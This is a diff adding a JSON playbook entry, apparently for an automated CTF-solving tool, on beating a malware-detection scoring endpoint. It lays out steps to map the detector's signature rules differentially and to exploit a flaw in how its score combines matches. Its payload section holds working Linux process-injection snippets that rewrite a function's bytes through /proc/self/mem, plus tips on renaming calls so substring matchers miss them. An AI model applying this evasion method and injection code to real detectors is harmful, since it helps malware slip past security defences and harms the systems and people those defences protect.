@@ -1,0 +1,47 @@
+{
+  "id": "auto-detector-scoring-evasion",
+  "title": "检测器对抗/免杀评分端点题(功能成立+规避检测双轨)",
+  "vuln_pattern": "提交样本到 /check|/submit|/evaluate 类评分端点换 flag：把'绕过检测'当成可计算的优化——找评分函数的结构性缺陷(非可加/组合去重)而非无脑免杀变形",
+  "fingerprint": [
+    "对抗评估", "对抗", "检测", "绕过", "免杀", "评分", "注入技术", "规避", "红队对抗",
+    "检测机制", "行为检测", "样本", "signature", "detection", "bypass", "triggered_rules",
+    "bypass_score", "waf"
+  ],
+  "exploit_steps": [
+    "先给检测器建模再写载荷：提交带经典签名的样本(如注入链原语)看触发规则数与响应结构；再提交完全不含签名的样本，确认能否进入评分流程(有的直接 500，说明'全清零'不可行)。",
+    "判定检测类型：逐条增删签名测独立性。若是白名单式子串匹配，就把精力转向【评分函数的结构性缺陷】，别继续做免杀变形。",
+    "重点找评分非可加性：某些弱签名单独出现各记 N 条、组合出现反而更少(组合去重/覆盖逻辑缺陷)→ 用'弱签名组合'把触发数压到阈值以下压线通过。",
+    "双轨达标：所选弱签名必须是真实可用的原语(样本功能真成立那一轨)；主动避开会给评分加分的相关签名。",
+    "迭代：写 diff 测试脚本对比通过/失败样本的响应字段(triggered_rules / bypass_score 等)，逐个签名定位边界，而不是盲改载荷——评分器响应的每个字段都是反馈信号。"
+  ],
+  "key_payloads": [
+    "# 差分探测骨架：对同一功能样本，逐个增删签名token，记录 {token: triggered_rules 增量} 建映射",
+    "for tok in candidate_tokens:  submit(base + tok); record(resp['triggered_rules'], resp.get('bypass_score'))",
+    "# 组合搜索：在满足'功能成立'的弱原语里，找触发数在阈值下的最小组合(利用组合去重缺陷)",
+    "# 静态vs动态判定：提交会回连的样本，无回调=评分器只做字符串匹配(不真跑)，据此定绕过策略",
+    "# 实测命中的弱签名组合(各3条、组合去重后2条压线, bypass_score=0.6 恰过 >=0.6 阈值)：",
+    "# Python 版最小双轨样本(13行,真实可运行的 Linux 注入原语, 无 ptrace)：",
+    "import os; fd = os.memfd_create('x', 0); m = os.open('/proc/self/mem', os.O_RDWR); print(os.memfd_create, m)",
+    "# C 版骨架：#define _GNU_SOURCE 才有 memfd_create；mmap 用 PROT_READ|PROT_WRITE(可写)再 mprotect 转 RX，只读页 memcpy 会 SIGSEGV",
+    "// C: int fd = memfd_create(\"stage\", 0); ... pwrite(mem_fd, \"\\x48\\x31\\xc0\\xc3\", 4, off_of_target_fn);  // 经 /proc/self/mem 改写函数前4字节",
+    "# 主动避开 ptrace(与上面组合会 +1 回 3 条)；OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread 是 5 条级,碰一个就基本重开",
+    "# 匹配器性质：大小写不敏感子串、无语法解析——驼峰 MemfdCreate 不触发、缺字母 process_vm_write 不触发、下划线结构必须保持"
+  ],
+  "category": "evasion",
+  "cve": [],
+  "tags": ["evasion", "detection-bypass", "scoring-endpoint", "对抗评估", "免杀"],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "目标是评分/评估端点：提交代码/载荷，返回 triggered_rules / bypass_score / pass 之类数值，双轨(功能+规避)评分",
+    "检测多为子串/签名匹配，规则可被差分逐条还原"
+  ],
+  "verify_oracle": "diff 出的 token→触发数映射稳定；找到一个既满足功能(可回连/可执行)又把触发数压到阈值以下的样本，评分端点返回 pass/给 flag",
+  "pitfalls": [
+    "完全规避所有签名通常不可行——样本进不了评分流程(常 500)",
+    "大小写/间接 syscall 类混淆往往只减分不清零；减不到阈值就果断换'评分组合缺陷'思路",
+    "别把'功能'塞进注释/字符串来骗质量预检——要真能运行的实现",
+    "工具/提交卡住就换路径(不同客户端/技术)，记 fact-log 别重测已知失败的组合"
+  ],
+  "anti_fingerprint": []
+}
